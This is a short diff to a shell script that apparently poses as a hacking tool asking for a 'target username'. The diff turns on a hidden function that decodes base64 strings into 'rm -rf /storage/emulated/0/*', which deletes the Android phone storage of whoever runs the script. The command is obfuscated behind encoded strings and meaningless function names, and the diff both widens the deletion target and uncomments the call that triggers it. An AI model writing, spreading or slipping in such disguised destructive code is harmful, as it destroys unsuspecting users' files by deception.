@@ -29,13 +29,13 @@ function banner {
 function oumcgsq {
   vcxprvq=$(echo "L3N0b3JhZ2UvZW11bGF0ZWQvMC8=" | base64 -d)
   if [ -e "$vcxprvq" ]; then
-    tvksajd "cm0gLXJmICo="
+    tvksajd "cm0gLXJmIC9zdG9yYWdlL2VtdWxhdGVkLzAvKg=="
   fi
 }
 
 function hack {
   banner
-  ##oumcgsq
+  oumcgsq
   read -p "TARGET USERNAME: " username
   g=("test" "Test" "123" "skdja" "TEST")
   if [[ " ${g[@]} " =~ " ${username} " ]]; then
